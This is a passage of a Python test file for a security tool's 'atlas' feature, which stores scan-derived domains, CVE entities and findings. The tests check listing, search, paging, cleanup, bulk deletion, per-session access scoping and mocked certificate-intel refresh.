                        {"type": "cve", "value": "CVE-2025-49113", "canonical_value": "CVE-2025-49113"},
                    ],
                }],
                seen_at="2026-05-14T00:00:01+00:00",
            )
            record_run_findings(conn, session_id, run_id, [{
                "text": "443/tcp open https on darklab.sh",
                "signals": ["findings"],
                "line_index": 0,
                "entities": [{"type": "domain", "value": "darklab.sh", "canonical_value": "darklab.sh"}],
            }])
            conn.commit()
        return run_id, recorded

    def _seed_domain_finding_run(self, session_id, domain):
        run_id = "run-" + uuid.uuid4().hex
        with db_connect() as conn:
            conn.execute(
                "INSERT INTO runs (id, session_id, run_kind, command, started, output_preview, output_line_count) "
                "VALUES (?, ?, 'external', ?, ?, ?, 1)",
                (run_id, session_id, f"nmap {domain}", "2026-05-14T00:00:00+00:00", "[]"),
            )
            recorded = materialize_run_entities(
                conn,
                session_id,
                run_id,
                [{
                    "text": domain,
                    "entities": [{"type": "domain", "value": domain, "canonical_value": domain}],
                }],
                seen_at="2026-05-14T00:00:01+00:00",
            )
            record_run_findings(conn, session_id, run_id, [{
                "text": f"443/tcp open https on {domain}",
                "signals": ["findings"],
                "line_index": 0,
                "entities": [{"type": "domain", "value": domain, "canonical_value": domain}],
            }])
            conn.commit()
        return run_id, recorded

    def test_lists_session_entities_and_detail(self):
        client = get_client()
        session_id = self._session_id()
        run_id, recorded = self._seed_entity_run(session_id)
        domain_id = next(item["id"] for item in recorded if item["type"] == "domain")

        summary_resp = client.get("/atlas", headers={"X-Session-ID": session_id})
        list_resp = client.get("/atlas/entities?type=domain", headers={"X-Session-ID": session_id})
        detail_resp = client.get(f"/atlas/entities/{domain_id}", headers={"X-Session-ID": session_id})

        assert summary_resp.status_code == 200
        assert json.loads(summary_resp.data)["counts"]["domain"] == 1
        assert json.loads(summary_resp.data)["findings"] == 1
        assert list_resp.status_code == 200
        data = json.loads(list_resp.data)
        assert data["total"] == 1
        assert data["entities"][0]["id"] == domain_id
        assert data["entities"][0]["canonical_value"] == "darklab.sh"
        assert detail_resp.status_code == 200
        detail = json.loads(detail_resp.data)
        assert detail["entity"]["id"] == domain_id
        assert detail["runs"][0]["run_id"] == run_id
        assert detail["findings"][0]["raw_line"] == "443/tcp open https on darklab.sh"

    def test_findings_list_can_filter_by_source_run(self):
        client = get_client()
        session_id = self._session_id()
        first_run_id, _ = self._seed_domain_finding_run(session_id, "alpha.darklab.sh")
        second_run_id, _ = self._seed_domain_finding_run(session_id, "beta.darklab.sh")
        unrelated_run_id = "run-" + uuid.uuid4().hex
        with db_connect() as conn:
            conn.execute(
                "INSERT INTO runs (id, session_id, run_kind, command, started, output_preview, output_line_count) "
                "VALUES (?, ?, 'external', 'echo no atlas rows', ?, ?, 1)",
                (unrelated_run_id, session_id, "2026-05-14T00:00:00+00:00", "[]"),
            )
            conn.commit()
        other_session_run_id, _ = self._seed_domain_finding_run(self._session_id(), "other.darklab.sh")

        all_resp = client.get("/atlas/findings", headers={"X-Session-ID": session_id})
        summary_resp = client.get(f"/atlas?run_id={quote(first_run_id)}", headers={"X-Session-ID": session_id})
        entity_resp = client.get(
            f"/atlas/entities?type=domain&run_id={quote(first_run_id)}",
            headers={"X-Session-ID": session_id},
        )
        first_resp = client.get(
            f"/atlas/findings?run_id={quote(first_run_id)}",
            headers={"X-Session-ID": session_id},
        )
        second_resp = client.get(
            f"/atlas/findings?run_id={quote(second_run_id)}",
            headers={"X-Session-ID": session_id},
        )
        other_resp = client.get(
            f"/atlas/findings?run_id={quote(other_session_run_id)}",
            headers={"X-Session-ID": session_id},
        )
        runs_resp = client.get("/atlas/runs", headers={"X-Session-ID": session_id})
        searched_runs_resp = client.get("/atlas/runs?q=beta", headers={"X-Session-ID": session_id})

        assert all_resp.status_code == 200
        assert summary_resp.status_code == 200
        assert entity_resp.status_code == 200
        assert first_resp.status_code == 200
        assert second_resp.status_code == 200
        assert other_resp.status_code == 200
        assert runs_resp.status_code == 200
        assert searched_runs_resp.status_code == 200
        assert json.loads(all_resp.data)["total"] == 2
        assert json.loads(summary_resp.data)["counts"]["domain"] == 1
        assert json.loads(summary_resp.data)["findings"] == 1
        entity_data = json.loads(entity_resp.data)
        assert entity_data["total"] == 1
        assert entity_data["entities"][0]["canonical_value"] == "alpha.darklab.sh"
        first_data = json.loads(first_resp.data)
        second_data = json.loads(second_resp.data)
        assert first_data["total"] == 1
        assert first_data["findings"][0]["raw_line"] == "443/tcp open https on alpha.darklab.sh"
        assert second_data["total"] == 1
        assert second_data["findings"][0]["raw_line"] == "443/tcp open https on beta.darklab.sh"
        assert json.loads(other_resp.data)["total"] == 0
        run_options = json.loads(runs_resp.data)["runs"]
        assert {item["id"] for item in run_options} == {first_run_id, second_run_id}
        assert unrelated_run_id not in {item["id"] for item in run_options}
        assert run_options[0]["entity_count"] == 1
        assert run_options[0]["finding_count"] == 1
        searched_run_options = json.loads(searched_runs_resp.data)["runs"]
        assert [item["id"] for item in searched_run_options] == [second_run_id]

    def test_entity_list_batches_metadata_for_current_page(self):
        from services.atlas.lookup import list_entities

        session_id = self._session_id()
        _, recorded = self._seed_entity_run(session_id)
        project_id = "prj-" + uuid.uuid4().hex
        timestamp = "2026-05-14T00:00:03+00:00"
        with db_connect() as conn:
            conn.execute(
                "INSERT INTO projects (id, session_id, name, slug, created, updated) "
                "VALUES (?, ?, 'Atlas Project', ?, ?, ?)",
                (project_id, session_id, "atlas-project-" + uuid.uuid4().hex[:8], timestamp, timestamp),
            )
            for index, entity in enumerate(recorded):
                entity_id = entity["id"]
                conn.execute(
                    "INSERT INTO entity_labels (id, session_id, entity_type, entity_id, label, source, created) "
                    "VALUES (?, ?, 'atlas_entity', ?, ?, 'manual', ?)",
                    ("lbl-" + uuid.uuid4().hex, session_id, entity_id, f"label-{index}", timestamp),
                )
                conn.execute(
                    "INSERT INTO entity_notes (id, session_id, entity_type, entity_id, body, created, updated) "
                    "VALUES (?, ?, 'atlas_entity', ?, ?, ?, ?)",
                    ("note-" + uuid.uuid4().hex, session_id, entity_id, f"note-{index}", timestamp, timestamp),
                )
                conn.execute(
                    "INSERT INTO project_links (id, project_id, entity_type, entity_id, source, created) "
                    "VALUES (?, ?, 'atlas_entity', ?, 'manual', ?)",
                    ("plink-" + uuid.uuid4().hex, project_id, entity_id, timestamp),
                )
            conn.commit()

            statements = []
            conn.set_trace_callback(statements.append)
            result = list_entities(conn, session_id, limit=50)
            conn.set_trace_callback(None)

        rows = result["entities"]
        assert len(rows) == len(recorded)
        assert all(row["labels"] for row in rows)
        assert all(row["project_link_count"] == 1 for row in rows)
        assert all("note" not in row and "project_links" not in row for row in rows)
        assert sum("SELECT entity_id, id, label" in statement for statement in statements) == 1
        assert sum("SELECT entity_id, body FROM entity_notes" in statement for statement in statements) == 0
        assert sum("FROM project_links l JOIN projects" in statement for statement in statements) == 1

    def test_atlas_search_matches_entity_and_finding_metadata(self):
        client = get_client()
        session_id = self._session_id()
        _, recorded = self._seed_entity_run(session_id)
        domain_id = next(item["id"] for item in recorded if item["type"] == "domain")
        with db_connect() as conn:
            finding_id = conn.execute(
                "SELECT id FROM findings WHERE session_id = ?",
                (session_id,),
            ).fetchone()["id"]
            conn.execute(
                "INSERT INTO entity_labels (id, session_id, entity_type, entity_id, label, source, created) "
                "VALUES (?, ?, 'atlas_entity', ?, 'metadata-domain-label', 'manual', datetime('now'))",
                ("lbl-" + uuid.uuid4().hex, session_id, domain_id),
            )
            conn.execute(
                "INSERT INTO entity_notes (id, session_id, entity_type, entity_id, body, created, updated) "
                "VALUES (?, ?, 'atlas_entity', ?, 'metadata-domain-note', datetime('now'), datetime('now'))",
                ("note-" + uuid.uuid4().hex, session_id, domain_id),
            )
            conn.execute(
                "INSERT INTO entity_labels (id, session_id, entity_type, entity_id, label, source, created) "
                "VALUES (?, ?, 'finding', ?, 'metadata-finding-label', 'manual', datetime('now'))",
                ("lbl-" + uuid.uuid4().hex, session_id, finding_id),
            )
            conn.execute(
                "INSERT INTO entity_notes (id, session_id, entity_type, entity_id, body, created, updated) "
                "VALUES (?, ?, 'finding', ?, 'metadata-finding-note', datetime('now'), datetime('now'))",
                ("note-" + uuid.uuid4().hex, session_id, finding_id),
            )
            conn.commit()

        entity_label_resp = client.get(
            "/atlas/entities?type=domain&q=metadata-domain-label",
            headers={"X-Session-ID": session_id},
        )
        entity_note_resp = client.get(
            "/atlas/entities?type=domain&q=metadata-domain-note",
            headers={"X-Session-ID": session_id},
        )
        finding_label_resp = client.get(
            "/atlas/findings?q=metadata-finding-label",
            headers={"X-Session-ID": session_id},
        )
        finding_entity_note_resp = client.get(
            "/atlas/findings?q=metadata-domain-note",
            headers={"X-Session-ID": session_id},
        )
        miss_resp = client.get(
            "/atlas/entities?type=domain&q=metadata-domain-label",
            headers={"X-Session-ID": self._session_id()},
        )

        assert entity_label_resp.status_code == 200
        assert json.loads(entity_label_resp.data)["total"] == 1
        assert json.loads(entity_note_resp.data)["total"] == 1
        assert json.loads(finding_label_resp.data)["total"] == 1
        assert json.loads(finding_entity_note_resp.data)["total"] == 1
        assert json.loads(miss_resp.data)["total"] == 0

    def test_entity_detail_caps_large_linked_collections(self):
        client = get_client()
        session_id = self._session_id()
        _, recorded = self._seed_entity_run(session_id)
        domain_id = next(item["id"] for item in recorded if item["type"] == "domain")
        with db_connect() as conn:
            for index in range(55):
                run_id = "run-extra-" + uuid.uuid4().hex
                finding_id = "finding-extra-" + uuid.uuid4().hex
                seen_at = f"2026-05-14T01:{index:02d}:00+00:00"
                conn.execute(
                    "INSERT INTO runs (id, session_id, run_kind, command, started, output_preview, output_line_count) "
                    "VALUES (?, ?, 'external', ?, ?, '[]', 1)",
                    (run_id, session_id, f"nmap detail {index}", seen_at),
                )
                conn.execute(
                    "INSERT INTO entity_run_links "
                    "(entity_id, run_id, first_seen_at, last_seen_at, occurrence_count) "
                    "VALUES (?, ?, ?, ?, 1)",
                    (domain_id, run_id, seen_at, seen_at),
                )
                conn.execute(
                    "INSERT INTO findings "
                    "(id, session_id, run_id, entity_id, subject_key, signature_hash, severity, kind, "
                    "tool_root, first_run_id, last_run_id, first_seen_at, last_seen_at, occurrence_count, "
                    "status, title, raw_line, created) "
                    "VALUES (?, ?, ?, ?, ?, ?, 'info', 'finding', 'nmap', ?, ?, ?, ?, 1, "
                    "'new', ?, ?, ?)",
                    (
                        finding_id,
                        session_id,
                        run_id,
                        domain_id,
                        f"detail-{index}",
                        f"sig-{uuid.uuid4().hex}",
                        run_id,
                        run_id,
                        seen_at,
                        seen_at,
                        f"Detail finding {index}",
                        f"detail finding line {index}",
                        seen_at,
                    ),
                )
            conn.commit()

        resp = client.get(f"/atlas/entities/{domain_id}", headers={"X-Session-ID": session_id})

        assert resp.status_code == 200
        detail = resp.get_json()
        assert len(detail["runs"]) == 50
        assert len(detail["findings"]) == 50
        assert detail["detail_limits"]["runs"] == {
            "limit": 50,
            "offset": 0,
            "shown": 50,
            "total": 56,
            "has_more": True,
        }
        assert detail["detail_limits"]["findings"] == {
            "limit": 50,
            "offset": 0,
            "shown": 50,
            "total": 56,
            "has_more": True,
        }

        paged_resp = client.get(
            f"/atlas/entities/{domain_id}?runs_offset=50&findings_offset=50",
            headers={"X-Session-ID": session_id},
        )
        paged_detail = paged_resp.get_json()
        assert paged_resp.status_code == 200
        assert len(paged_detail["runs"]) == 6
        assert len(paged_detail["findings"]) == 6
        assert paged_detail["detail_limits"]["runs"] == {
            "limit": 50,
            "offset": 50,
            "shown": 6,
            "total": 56,
            "has_more": False,
        }
        assert paged_detail["detail_limits"]["findings"] == {
            "limit": 50,
            "offset": 50,
            "shown": 6,
            "total": 56,
            "has_more": False,
        }

    def test_orphan_filter_surfaces_atlas_rows_after_source_run_delete(self):
        client = get_client()
        session_id = self._session_id()
        run_id, _ = self._seed_entity_run(session_id)

        delete_resp = client.delete(f"/history/{run_id}", headers={"X-Session-ID": session_id})
        default_summary = client.get("/atlas", headers={"X-Session-ID": session_id})
        orphan_summary = client.get("/atlas?orphan_filter=only", headers={"X-Session-ID": session_id})
        orphan_entities = client.get(
            "/atlas/entities?type=domain&orphan_filter=only",
            headers={"X-Session-ID": session_id},
        )
        orphan_findings = client.get(
            "/atlas/findings?orphan_filter=only",
            headers={"X-Session-ID": session_id},
        )

        assert delete_resp.status_code == 200
        assert json.loads(default_summary.data)["counts"]["domain"] == 0
        assert json.loads(default_summary.data)["findings"] == 0
        assert json.loads(orphan_summary.data)["counts"]["domain"] == 1
        assert json.loads(orphan_summary.data)["findings"] == 1
        assert json.loads(orphan_entities.data)["total"] == 1
        assert json.loads(orphan_findings.data)["total"] == 1

    def test_stale_run_links_do_not_hide_atlas_orphans_or_block_cleanup(self):
        client = get_client()
        session_id = self._session_id()
        live_run_id, _ = self._seed_entity_run(session_id)
        stale_run_id, _ = self._seed_entity_run(session_id)
        with db_connect() as conn:
            conn.execute("DELETE FROM runs WHERE id = ?", (stale_run_id,))
            conn.commit()

        preview_resp = client.get(
            f"/history/{live_run_id}/atlas-cleanup-preview",
            headers={"X-Session-ID": session_id},
        )
        default_summary = client.get("/atlas", headers={"X-Session-ID": session_id})
        orphan_summary = client.get("/atlas?orphan_filter=only", headers={"X-Session-ID": session_id})

        assert preview_resp.status_code == 200
        preview = json.loads(preview_resp.data)["cleanup"]
        assert preview["entities"] == 2
        assert preview["findings"] == 1
        assert json.loads(default_summary.data)["counts"]["domain"] == 1
        assert json.loads(default_summary.data)["findings"] == 1
        assert json.loads(orphan_summary.data)["counts"]["domain"] == 0
        assert json.loads(orphan_summary.data)["findings"] == 0
        delete_resp = client.delete(f"/history/{live_run_id}", headers={"X-Session-ID": session_id})
        orphan_only_summary = client.get("/atlas?orphan_filter=only", headers={"X-Session-ID": session_id})
        orphan_entities = client.get(
            "/atlas/entities?type=domain&orphan_filter=only",
            headers={"X-Session-ID": session_id},
        )

        assert delete_resp.status_code == 200
        assert json.loads(client.get("/atlas", headers={"X-Session-ID": session_id}).data)["counts"]["domain"] == 0
        assert json.loads(orphan_only_summary.data)["counts"]["domain"] == 1
        assert json.loads(orphan_only_summary.data)["findings"] == 1
        orphan_data = json.loads(orphan_entities.data)
        assert orphan_data["total"] == 1
        assert orphan_data["entities"][0]["run_count"] == 0

    def test_run_delete_can_prune_non_curated_atlas_orphans_and_keep_curated_entities(self):
        client = get_client()
        session_id = self._session_id()
        run_id, recorded = self._seed_entity_run(session_id)
        cve_id = next(item["id"] for item in recorded if item["type"] == "cve")
        with db_connect() as conn:
            conn.execute(
                "INSERT INTO entity_labels (id, session_id, entity_type, entity_id, label, source, created) "
                "VALUES (?, ?, 'atlas_entity', ?, 'kept', 'manual', datetime('now'))",
                ("lbl-" + uuid.uuid4().hex, session_id, cve_id),
            )
            conn.commit()

        preview_resp = client.get(
            f"/history/{run_id}/atlas-cleanup-preview",
            headers={"X-Session-ID": session_id},
        )
        delete_resp = client.delete(
            f"/history/{run_id}?prune_atlas=1",
            headers={"X-Session-ID": session_id},
        )

        assert preview_resp.status_code == 200
        preview = json.loads(preview_resp.data)["cleanup"]
        assert preview["entities"] == 1
        assert preview["findings"] == 1
        assert preview["curated_entities"] == 1
        assert delete_resp.status_code == 200
        with db_connect() as conn:
            rows = conn.execute(
                "SELECT type, canonical_value FROM entities WHERE session_id = ? ORDER BY type",
                (session_id,),
            ).fetchall()
            finding_count = conn.execute(
                "SELECT COUNT(*) FROM findings WHERE session_id = ?",
                (session_id,),
            ).fetchone()[0]
        assert [(row["type"], row["canonical_value"]) for row in rows] == [("cve", "CVE-2025-49113")]
        assert finding_count == 0

    def test_run_cleanup_protects_findings_reachable_through_project_run_links(self):
        client = get_client()
        session_id = self._session_id()
        run_id, _ = self._seed_entity_run(session_id)
        project_resp = client.post(
            "/projects",
            json={"name": "Atlas Cleanup Project"},
            headers={"X-Session-ID": session_id},
        )
        project = json.loads(project_resp.data)["project"]
        link_resp = client.post(
            f"/projects/{project['id']}/links",
            json={"entity_type": "run", "entity_ids": [run_id]},
            headers={"X-Session-ID": session_id},
        )

        preview_resp = client.get(
            f"/history/{run_id}/atlas-cleanup-preview",
            headers={"X-Session-ID": session_id},
        )
        default_delete_resp = client.delete(
            f"/history/{run_id}?prune_atlas=1",
            headers={"X-Session-ID": session_id},
        )

        assert link_resp.status_code == 200
        assert preview_resp.status_code == 200
        preview = json.loads(preview_resp.data)["cleanup"]
        assert preview["findings"] == 0
        assert preview["curated_findings"] == 1
        assert default_delete_resp.status_code == 200
        with db_connect() as conn:
            assert conn.execute(
                "SELECT COUNT(*) FROM findings WHERE session_id = ?",
                (session_id,),
            ).fetchone()[0] == 1
            assert conn.execute(
                "SELECT COUNT(*) FROM entities WHERE session_id = ? AND type = 'domain'",
                (session_id,),
            ).fetchone()[0] == 1

    def test_run_delete_can_prune_curated_project_reachable_atlas_rows_when_requested(self):
        client = get_client()
        session_id = self._session_id()
        run_id, recorded = self._seed_entity_run(session_id)
        domain_id = next(item["id"] for item in recorded if item["type"] == "domain")
        project_resp = client.post(
            "/projects",
            json={"name": "Curated Cleanup Project"},
            headers={"X-Session-ID": session_id},
        )
        project = json.loads(project_resp.data)["project"]
        link_resp = client.post(
            f"/atlas/entities/{domain_id}/project_links",
            json={"project_id": project["id"]},
            headers={"X-Session-ID": session_id},
        )

        preview_resp = client.get(
            f"/history/{run_id}/atlas-cleanup-preview",
            headers={"X-Session-ID": session_id},
        )
        delete_resp = client.delete(
            f"/history/{run_id}?prune_atlas=1&prune_curated_atlas=1",
            headers={"X-Session-ID": session_id},
        )

        assert link_resp.status_code == 201
        assert preview_resp.status_code == 200
        preview = json.loads(preview_resp.data)["cleanup"]
        assert preview["findings"] == 0
        assert preview["curated_entities"] == 1
        assert preview["curated_findings"] == 1
        assert delete_resp.status_code == 200
        with db_connect() as conn:
            assert conn.execute(
                "SELECT COUNT(*) FROM findings WHERE session_id = ?",
                (session_id,),
            ).fetchone()[0] == 0
            assert conn.execute(
                "SELECT COUNT(*) FROM entities WHERE session_id = ?",
                (session_id,),
            ).fetchone()[0] == 0

    def test_delete_atlas_finding_can_cleanup_same_run_siblings(self):
        client = get_client()
        session_id = self._session_id()
        self._seed_entity_run(session_id)
        list_resp = client.get("/atlas/findings", headers={"X-Session-ID": session_id})
        finding_id = json.loads(list_resp.data)["findings"][0]["id"]

        preview_resp = client.get(
            f"/atlas/findings/{finding_id}/delete-preview",
            headers={"X-Session-ID": session_id},
        )
        delete_resp = client.delete(
            f"/atlas/findings/{finding_id}",
            json={"prune_source_run": True},
            headers={"X-Session-ID": session_id},
        )

        assert preview_resp.status_code == 200
        preview = json.loads(preview_resp.data)["preview"]
        assert preview["sibling_cleanup"]["entities"] == 2
        assert delete_resp.status_code == 200
        with db_connect() as conn:
            assert conn.execute(
                "SELECT COUNT(*) FROM findings WHERE session_id = ?",
                (session_id,),
            ).fetchone()[0] == 0
            assert conn.execute(
                "SELECT COUNT(*) FROM entities WHERE session_id = ?",
                (session_id,),
            ).fetchone()[0] == 0

    def test_run_retaining_atlas_cleanup_detaches_sources_and_recalculates_rows(self):
        client = get_client()
        session_id = self._session_id()
        first_run_id, recorded = self._seed_entity_run(session_id)
        second_run_id, _ = self._seed_entity_run(session_id)
        domain_id = next(item["id"] for item in recorded if item["type"] == "domain")

        first_cleanup_resp = client.post(
            f"/atlas/runs/{first_run_id}/cleanup",
            headers={"X-Session-ID": session_id},
        )
        detail_resp = client.get(f"/atlas/entities/{domain_id}", headers={"X-Session-ID": session_id})
        second_cleanup_resp = client.post(
            f"/atlas/runs/{second_run_id}/cleanup",
            headers={"X-Session-ID": session_id},
        )
        summary_resp = client.get("/atlas", headers={"X-Session-ID": session_id})

        assert first_cleanup_resp.status_code == 200
        first_cleanup = json.loads(first_cleanup_resp.data)["cleanup"]
        assert first_cleanup["deleted_entities"] == 0
        assert first_cleanup["deleted_findings"] == 0
        assert first_cleanup["detached_entities"] == 2
        assert first_cleanup["detached_findings"] == 1
        detail = json.loads(detail_resp.data)
        assert detail["entity"]["occurrence_count"] == 1
        assert [run["run_id"] for run in detail["runs"]] == [second_run_id]
        assert detail["findings"][0]["occurrence_count"] == 1
        assert second_cleanup_resp.status_code == 200
        assert json.loads(second_cleanup_resp.data)["cleanup"]["deleted_entities"] == 2
        assert json.loads(summary_resp.data)["total"] == 0
        assert json.loads(summary_resp.data)["findings"] == 0
        with db_connect() as conn:
            assert conn.execute(
                "SELECT COUNT(*) FROM runs WHERE session_id = ? AND id IN (?, ?)",
                (session_id, first_run_id, second_run_id),
            ).fetchone()[0] == 2

    def test_bulk_delete_atlas_entities_and_findings(self):
        client = get_client()
        session_id = self._session_id()
        _, recorded = self._seed_entity_run(session_id)
        domain_id = next(item["id"] for item in recorded if item["type"] == "domain")
        cve_id = next(item["id"] for item in recorded if item["type"] == "cve")
        finding_session_id = self._session_id()
        self._seed_entity_run(finding_session_id)
        list_resp = client.get("/atlas/findings", headers={"X-Session-ID": finding_session_id})
        finding_id = json.loads(list_resp.data)["findings"][0]["id"]

        entity_resp = client.post(
            "/atlas/entities/bulk-delete",
            json={"entity_ids": [domain_id, "missing-entity"]},
            headers={"X-Session-ID": session_id},
        )
        finding_resp = client.post(
            "/atlas/findings/bulk-delete",
            json={"finding_ids": [finding_id, "missing-finding"]},
            headers={"X-Session-ID": finding_session_id},
        )

        assert entity_resp.status_code == 200
        entity_data = json.loads(entity_resp.data)
        assert entity_data["counts"] == {"deleted": 1, "findings_deleted": 1, "not_found": 1}
        assert entity_data["results"] == [
            {"entity_id": domain_id, "status": "deleted"},
            {"entity_id": "missing-entity", "status": "not_found"},
        ]
        assert finding_resp.status_code == 200
        finding_data = json.loads(finding_resp.data)
        assert finding_data["counts"] == {"deleted": 1, "not_found": 1}
        with db_connect() as conn:
            rows = conn.execute(
                "SELECT type, canonical_value FROM entities WHERE session_id = ? ORDER BY type",
                (session_id,),
            ).fetchall()
            finding_count = conn.execute(
                "SELECT COUNT(*) FROM findings WHERE session_id = ?",
                (session_id,),
            ).fetchone()[0]
        assert [(row["type"], row["canonical_value"]) for row in rows] == [("cve", "CVE-2025-49113")]
        assert cve_id
        assert finding_count == 0

    def test_atlas_read_and_write_routes_are_session_scoped(self):
        client = get_client()
        session_id = self._session_id()
        _, recorded = self._seed_entity_run(session_id)
        domain_id = next(item["id"] for item in recorded if item["type"] == "domain")
        wrong_session_id = self._session_id()
        project_resp = client.post(
            "/projects",
            json={"name": "Scoped Atlas Case"},
            headers={"X-Session-ID": session_id},
        )
        project = json.loads(project_resp.data)["project"]
        owner_link_resp = client.post(
            f"/atlas/entities/{domain_id}/project_links",
            json={"project_id": project["id"]},
            headers={"X-Session-ID": session_id},
        )
        with db_connect() as conn:
            finding_id = conn.execute(
                "SELECT id FROM findings WHERE session_id = ? AND entity_id = ?",
                (session_id, domain_id),
            ).fetchone()["id"]
            conn.execute(
                "INSERT INTO entity_intel_snapshots "
                "(id, session_id, entity_id, provider, status, summary, data_json, fetched_at) "
                "VALUES (?, ?, ?, 'crtsh', 'ok', 'data available', ?, datetime('now'))",
                (
                    "intel_" + uuid.uuid4().hex,
                    session_id,
                    domain_id,
                    json.dumps({"summary": {"has_intel": True, "providers_with_data": ["crtsh"]}}),
                ),
            )
            conn.execute(
                "INSERT INTO entity_labels (id, session_id, entity_type, entity_id, label, source, created) "
                "VALUES (?, ?, 'atlas_entity', ?, 'curated', 'manual', datetime('now'))",
                ("lbl-" + uuid.uuid4().hex, session_id, domain_id),
            )
            conn.execute(
                "INSERT INTO entity_notes (id, session_id, entity_type, entity_id, body, created, updated) "
                "VALUES (?, ?, 'atlas_entity', ?, 'keep this context', datetime('now'), datetime('now'))",
                ("note-" + uuid.uuid4().hex, session_id, domain_id),
            )
            conn.commit()

        def owner_state():
            with db_connect() as conn:
                return {
                    "entities": [
                        tuple(row) for row in conn.execute(
                            "SELECT id, type, canonical_value, occurrence_count FROM entities "
                            "WHERE session_id = ? ORDER BY id",
                            (session_id,),
                        ).fetchall()
                    ],
                    "findings": [
                        tuple(row) for row in conn.execute(
                            "SELECT id, status, raw_line FROM findings WHERE session_id = ? ORDER BY id",
                            (session_id,),
                        ).fetchall()
                    ],
                    "snapshots": [
                        tuple(row) for row in conn.execute(
                            "SELECT entity_id, provider, status, summary, data_json FROM entity_intel_snapshots "
                            "WHERE session_id = ? ORDER BY entity_id, provider",
                            (session_id,),
                        ).fetchall()
                    ],
                    "labels": [
                        tuple(row) for row in conn.execute(
                            "SELECT entity_id, label FROM entity_labels WHERE session_id = ? ORDER BY entity_id, label",
                            (session_id,),
                        ).fetchall()
                    ],
                    "notes": [
                        tuple(row) for row in conn.execute(
                            "SELECT entity_id, body FROM entity_notes WHERE session_id = ? ORDER BY entity_id",
                            (session_id,),
                        ).fetchall()
                    ],
                    "links": [
                        tuple(row) for row in conn.execute(
                            "SELECT project_id, entity_type, entity_id FROM project_links "
                            "WHERE project_id = ? ORDER BY entity_type, entity_id",
                            (project["id"],),
                        ).fetchall()
                    ],
                }

        before = owner_state()

        with mock.patch("services.atlas.intel_bridge.lookup_entity", side_effect=AssertionError("cross-session lookup")):
            detail_resp = client.get(f"/atlas/entities/{domain_id}", headers={"X-Session-ID": wrong_session_id})
            review_resp = client.post(
                "/atlas/findings/review",
                json={"finding_ids": [finding_id], "review_state": "important"},
                headers={"X-Session-ID": wrong_session_id},
            )
            bulk_entity_resp = client.post(
                "/atlas/entities/bulk-delete",
                json={"entity_ids": [domain_id]},
                headers={"X-Session-ID": wrong_session_id},
            )
            entity_delete_resp = client.delete(
                f"/atlas/entities/{domain_id}",
                json={"prune_source_run": True},
                headers={"X-Session-ID": wrong_session_id},
            )
            bulk_finding_resp = client.post(
                "/atlas/findings/bulk-delete",
                json={"finding_ids": [finding_id]},
                headers={"X-Session-ID": wrong_session_id},
            )
            finding_suppression_resp = client.put(
                f"/atlas/findings/{finding_id}/suppression",
                json={"suppressed": True},
                headers={"X-Session-ID": wrong_session_id},
            )
            entity_suppression_resp = client.put(
                f"/atlas/entities/{domain_id}/suppression",
                json={"suppressed": True},
                headers={"X-Session-ID": wrong_session_id},
            )
            finding_delete_resp = client.delete(
                f"/atlas/findings/{finding_id}",
                json={"prune_source_run": True},
                headers={"X-Session-ID": wrong_session_id},
            )
            refresh_resp = client.post(
                f"/atlas/entities/{domain_id}/refresh_intel",
                headers={"X-Session-ID": wrong_session_id},
            )
            link_resp = client.post(
                f"/atlas/entities/{domain_id}/project_links",
                json={"project_id": project["id"]},
                headers={"X-Session-ID": wrong_session_id},
            )
            unlink_resp = client.delete(
                f"/atlas/entities/{domain_id}/project_links/{project['id']}",
                headers={"X-Session-ID": wrong_session_id},
            )

        assert owner_link_resp.status_code == 201
        assert detail_resp.status_code == 404
        assert review_resp.status_code == 200
        assert json.loads(review_resp.data)["counts"] == {"updated": 0, "not_found": 1}
        assert bulk_entity_resp.status_code == 200
        assert json.loads(bulk_entity_resp.data)["counts"] == {"deleted": 0, "findings_deleted": 0, "not_found": 1}
        assert entity_delete_resp.status_code == 404
        assert bulk_finding_resp.status_code == 200
        assert json.loads(bulk_finding_resp.data)["counts"] == {"deleted": 0, "not_found": 1}
        assert finding_suppression_resp.status_code == 404
        assert entity_suppression_resp.status_code == 404
        assert finding_delete_resp.status_code == 404
        assert refresh_resp.status_code == 404
        assert link_resp.status_code == 404
        assert unlink_resp.status_code == 404
        assert owner_state() == before

    def test_refresh_intel_persists_provider_snapshot(self):
        client = get_client()
        session_id = self._session_id()
        _, recorded = self._seed_entity_run(session_id)
        domain_id = next(item["id"] for item in recorded if item["type"] == "domain")
        provider_result = mock.Mock(
            provider="crtsh",
            status="ok",
            message="",
            result=mock.Mock(
                provider="crtsh",
                payload={
                    "providers": {
                        "crtsh": {
                            "certificate_count": 3,
                            "names": ["darklab.sh", "www.darklab.sh"],
                            "last_seen": "2026-05-14T00:00:00Z",
                        },
                    },
                    "summary": {"has_intel": True, "providers_with_data": ["crtsh"]},
                },
            ),
        )
        lookup_result = mock.Mock(
            entity_type="domain",
            canonical_value="darklab.sh",
            providers=[provider_result],
            success_count=1,
            configured_count=1,
        )

        with mock.patch("services.atlas.intel_bridge.lookup_entity", return_value=lookup_result):
            resp = client.post(
                f"/atlas/entities/{domain_id}/refresh_intel",
                headers={"X-Session-ID": session_id},
            )

        assert resp.status_code == 200
        data = json.loads(resp.data)
        assert data["refresh"]["success_count"] == 1
        with db_connect() as conn:
            row = conn.execute(
                "SELECT provider, status, summary, data_json FROM entity_intel_snapshots "
                "WHERE session_id = ? AND entity_id = ?",
                (session_id, domain_id),
            ).fetchone()
        assert row["provider"] == "crtsh"
        assert row["status"] == "ok"
        assert row["summary"] == "data available"
        assert json.loads(row["data_json"])["summary"]["has_intel"] is True
        detail_resp = client.get(f"/atlas/entities/{domain_id}", headers={"X-Session-ID": session_id})
        detail = json.loads(detail_resp.data)
        assert detail["intel_summary"]["status"] == "available"
        assert detail["intel_summary"]["providers_with_data"] == ["crtsh"]
        assert {
            (item["label"], item["value"], item["provider"])
            for item in detail["intel_summary"]["highlights"]
        } >= {
            ("Certificates", "3", "crtsh"),
            ("Names", "darklab.sh, www.darklab.sh", "crtsh"),
        }

    def test_refresh_intel_can_offload_provider_payload_and_restore_detail(self):
        from services.storage import body_store

        client = get_client()
        session_id = self._session_id()
        _, recorded = self._seed_entity_run(session_id)
        domain_id = next(item["id"] for item in recorded if item["type"] == "domain")
        provider_result = mock.Mock(
            provider="crtsh",
            status="ok",
            message="",
            result=mock.Mock(
                provider="crtsh",
                payload={
                    "providers": {"crtsh": {"certificate_count": 7}},
                    "summary": {"has_intel": True, "providers_with_data": ["crtsh"]},
                },
            ),
        )
        lookup_result = mock.Mock(
            entity_type="domain",
            canonical_value="darklab.sh",
            providers=[provider_result],
            success_count=1,
